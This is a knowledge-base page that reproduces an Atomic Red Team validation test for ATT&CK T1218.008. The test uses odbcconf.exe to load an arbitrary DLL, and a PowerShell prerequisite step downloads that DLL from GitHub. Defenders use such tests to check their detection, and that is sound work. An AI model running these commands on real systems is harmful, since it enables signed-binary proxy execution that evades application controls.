---
atomic_guid: "2430498b-06c0-4b92-a448-8ad263c388e2"
title: "Odbcconf.exe - Execute Arbitrary DLL"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.008"
attack_technique_name: "Signed Binary Proxy Execution: Odbcconf"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "2430498b-06c0-4b92-a448-8ad263c388e2"
  - "Odbcconf.exe - Execute Arbitrary DLL"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Odbcconf.exe - Execute Arbitrary DLL

Execute arbitrary DLL file stored locally.

## Metadata

- Atomic GUID: 2430498b-06c0-4b92-a448-8ad263c388e2
- Technique: T1218.008: Signed Binary Proxy Execution: Odbcconf
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218.008/T1218.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.008]]

## Input Arguments

### dll_payload

- description: DLL to execute
- type: path
- default: PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll

## Dependencies

T1218-2.dll must exist on disk at specified location (#{dll_payload})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
```

## Executor

- name: command_prompt

### Command

```cmd
odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml)
